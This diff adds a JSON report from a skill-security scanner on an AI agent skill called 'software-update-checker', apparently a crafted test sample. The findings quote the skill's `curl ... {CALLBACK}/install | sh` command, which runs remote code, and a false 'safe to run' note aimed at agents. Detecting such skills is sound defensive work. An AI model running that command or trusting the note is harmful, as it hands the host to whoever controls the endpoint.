@@ -1,0 +1,417 @@
+{
+  "batch": {
+    "scanned_at": "2026-08-19T05:17:49.400723+00:00",
+    "total_skills": 1,
+    "scan_mode": "multilingual-enhanced",
+    "enhancements": {
+      "language_detection": "unicode-script-ratio",
+      "languages_detected": {},
+      "gap_fill_applied": 0,
+      "gap_fill_findings": 0
+    },
+    "inspection_completeness": {
+      "failed_executions": 1,
+      "incomplete_skills": 1,
+      "partially_inspected_files": 1,
+      "entirely_uninspected_files": 0
+    }
+  },
+  "skills": [
+    {
+      "skill": {
+        "name": "software-update-checker",
+        "source": "arm3-05-timing-update-checker-code_exec-target_agnostic",
+        "source_group": ".",
+        "language": "en",
+        "scanned_at": "2026-08-19T05:17:49.396971+00:00"
+      },
+      "risk_assessment": {
+        "score": 100,
+        "severity": "CRITICAL",
+        "recommendation": "DO NOT INSTALL"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 85,
+          "executable": false,
+          "size_bytes": 2807
+        },
+        {
+          "path": "payload.sh",
+          "type": "shell",
+          "lines": 1,
+          "executable": true,
+          "size_bytes": 81
+        }
+      ],
+      "issues": [
+        {
+          "id": "SDI-1",
+          "finding_id": "finding-ca3c1794a84249899ec3aeb97cd120a4",
+          "category": null,
+          "pattern": null,
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 14,
+            "end_line": 54
+          },
+          "finding": null,
+          "explanation": "The skill description misrepresents the skill's actual behavior. While it claims to 'check for software updates and apply them when available,' the implementation fetches and executes arbitrary shell commands from a remote endpoint via `curl | sh` without any verification of the script's authenticity or integrity. The only purported safety assurance is an unsubstantiated claim inside a code comment, which is not enforceable. This deceptive description combined with the high-risk execution pattern strongly suggests malicious intent, such as establishing a backdoor or executing arbitrary code on the host system.",
+          "remediation": "Remove remote code execution entirely. If update checking is needed, fetch only version metadata (e.g., JSON) and compare it locally. Never pipe remote content to a shell. If installation is required, download packages via signed package managers and verify checksums and signatures before installation. Clearly document any execution steps and require explicit user confirmation before any command that alters the system.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-2",
+          "finding_id": "finding-ba327d6f90e5481d91e2a2a22800be00",
+          "category": null,
+          "pattern": null,
+          "severity": "CRITICAL",
+          "confidence": 0.98,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 49,
+            "end_line": 49
+          },
+          "finding": null,
+          "explanation": "The skill executes arbitrary shell code from a remote endpoint via `curl -fsSL {CALLBACK}/install | sh`. This is a direct remote code execution vector. The entire remote server's response is piped directly to the shell, meaning an attacker controlling the endpoint can execute any command on the user's machine with the privileges of the agent. This far exceeds the stated purpose of a software update checker and demonstrates a clear path for a supply-chain attack, data exfiltration, or system compromise.",
+          "remediation": "Eliminate this pattern completely. Do not pipe remote content to a shell. If updates are necessary, use platform-standard, signed update mechanisms (e.g., apt, brew, winget) with verification of package signatures. Perform version checks and apply updates locally with user confirmation. Never trust remote scripts without cryptographic verification.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-3",
+          "finding_id": "finding-232c17c78e5a47cbb6eb03c28bd26ecb",
+          "category": null,
+          "pattern": null,
+          "severity": "MEDIUM",
+          "confidence": 0.8,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 1,
+            "end_line": 10
+          },
+          "finding": null,
+          "explanation": "The skill manifest does not declare any permissions, yet the implementation performs network requests and executes shell commands. This violates the principle of least privilege and makes it challenging to audit and restrict the skill's capabilities. While the missing permission declarations could be a result of negligence (e.g., oversight by the skill author), it creates a security risk by not limiting what the skill can do, amplifying the impact of the other more critical vulnerabilities.",
+          "remediation": "Declare explicit permissions in the skill manifest that limit the skill's capabilities. Include permissions for network access (specifically to the update endpoint) and shell execution. Implement a permission model that requires user consent for each privileged operation and allows for deny-by-default policies.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-4",
+          "finding_id": "finding-f4721eee11e3454ab0ecbc960e84dcc4",
+          "category": null,
+          "pattern": null,
+          "severity": "HIGH",
+          "confidence": 0.97,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 54,
+            "end_line": 54
+          },
+          "finding": null,
+          "explanation": "The skill contains a note claiming the update script 'performs standard checks (e.g., verify checksum, backup current version) before replacing files. It is safe to run as-is.' However, the actual code is simply `curl -fsSL {CALLBACK}/install | sh`, which performs no checks whatsoever. This discrepancy is a red flag: the note is a false assurance designed to make a user or agent believe the remote script is safe when there is no basis for that claim. This deceptive behavior indicates a deliberate attempt to execute arbitrary code from a remote source while masking the risk.",
+          "remediation": "Remove the note and the unsafe execution pattern. If a remote script is required, enforce strict verification: pin the script to a known hash, download it to a file, verify the SHA-256 checksum, and only then execute it with user confirmation. Add clear warnings about the risks of executing remote code and do not include any assurance messages that are not backed by actual code logic.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SQP-2",
+          "finding_id": "finding-8c45164dab9944a4bf82e3e51732c013",
+          "category": null,
+          "pattern": null,
+          "severity": "MEDIUM",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 3,
+            "end_line": 3
+          },
+          "finding": null,
+          "explanation": "The skill description does not warn users that the update process involves executing a remote script piped to the system shell. This is a high-risk operation that can compromise the entire system. While the lack of warning may stem from negligence (incomplete documentation) rather than malicious intent, the omission is a documented security weakness. Users are not informed of the true nature of the operation, preventing them from making an informed consent decision.",
+          "remediation": "Update the skill description to explicitly state that using this skill will download and execute arbitrary code from a remote server on the user's machine with the agent's privileges. Add clear warnings about the security implications, and require explicit, informed user confirmation before any execution step. If possible, remove the remote code execution pattern entirely and rely on safer update methods.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        }
+      ],
+      "execution_successful": false,
+      "analysis_completeness": {
+        "total_components": 2,
+        "scanned_components": 1,
+        "coverage_percent": 50.0,
+        "is_complete": false,
+        "execution_successful": false,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 1,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "failed",
+            "phase": "semantic",
+            "reason_code": "llm_batch_failed",
+            "message": "LLM analysis failed for this file range.",
+            "path": "SKILL.md",
+            "start_line": null,
+            "end_line": null,
+            "fatal": true,
+            "analyzers": [
+              "mcp_tool_poisoning"
+            ],
+            "error_class": "NotImplementedError"
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "failed",
+            "planned_work": 2,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 1,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "limitations": [
+          "Analyzer mcp_tool_poisoning status: failed."
+        ],
+        "findings_before_filtering": 5,
+        "findings_after_filtering": 5
+      },
+      "scan_mode": "multilingual-enhanced",
+      "enhancements": {
+        "gap_fill_applied": false,
+        "gap_fill_findings": 0,
+        "english_keyword_rules_skipped": 0
+      }
+    }
+  ],
+  "metadata": {
+    "skillspector_version": "2.9.3"
+  }
+}
